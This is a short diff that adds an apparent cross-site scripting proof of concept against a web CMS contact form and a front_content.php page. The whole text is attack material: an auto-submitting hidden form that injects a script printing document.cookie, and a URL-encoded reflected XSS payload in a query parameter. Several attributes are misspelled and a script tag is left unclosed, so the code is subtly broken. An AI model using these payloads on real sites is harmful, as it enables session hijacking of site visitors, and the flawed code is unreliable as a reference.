@@ -1,0 +1,10 @@
+&lt;form action=http://www.example.com/path/to/contact/form.html?parentid= methos=POST name=M&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;send&quot; valuye=&quot;1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;Vorname&quot; valuye=&#039;z&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.M.Submit();
+&lt;script&gt;
+
+
+http://www.example.com/en/front_content.php?idart=1267%27%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
